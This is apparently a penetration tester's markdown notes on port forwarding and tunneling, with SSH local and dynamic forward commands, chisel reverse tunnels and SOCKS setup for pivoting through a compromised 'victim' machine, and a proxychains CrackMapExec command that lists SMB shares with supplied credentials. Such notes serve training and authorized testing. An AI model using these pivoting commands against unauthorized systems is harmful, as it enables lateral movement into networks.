

# Port Forwarding & Tunneling
--------

### Local Portforward
- Forward a single port from our machine to the victim machine.
A web server running on victim machine's port 8888 can be accessed locally on our machine's port 4444
```bash
ssh -L 4444:2.2.2.2:8888 user@2.2.2.2
```

On a new line hold shift and type `~C` to drop into the ssh prompt
```bash
ssh> -L 8001:192.168.122.4:80
```

Using **chisel**
```bash
./chisel_linux server -p 8080 -reverse
```

```cmd
chis.exe client 192.168.49.197:8080 R:8001:127.0.0.1:80 
```

Client makes a connection to chisel server running on port 8080 and forwards localhost 80 on victim machine to remote 8081 (attacker 8081)

----------------------

### Dynamic Portforward
Forwarding all traffic from our machine to the victim using another compromised machine as tunnel. (using socks proxy)
For use w proxychains.

Using **ssh**
```bash
ssh -N -D 127.0.0.1:1080 sean@10.11.1.251
```

where 1080 is the IP address where socks5 proxy (proxychains) is running.

#### SOCKS5 + Chisel
- Set up  socks5 proxy in proxychains conf
Server:
```bash
./chisel_linux server -p 8080 -reverse
```

Client:
```cmd
.\chisel.exe client 10.10.10.10:8080 R:socks
```

Now use proxychains and cme to access shares:
```bash
proxychains cme smb 192.168.137.138 -u cbbn -p something --shares
```

https://blog.lukasec.ch/posts/pivoting.html

-------------


- [ ] include stuff from netsh!!!!!!
https://porterhau5.com/blog/native-port-forwarding-windows/

https://erev0s.com/blog/ssh-local-remote-and-dynamic-port-forwarding-explain-it-i-am-five/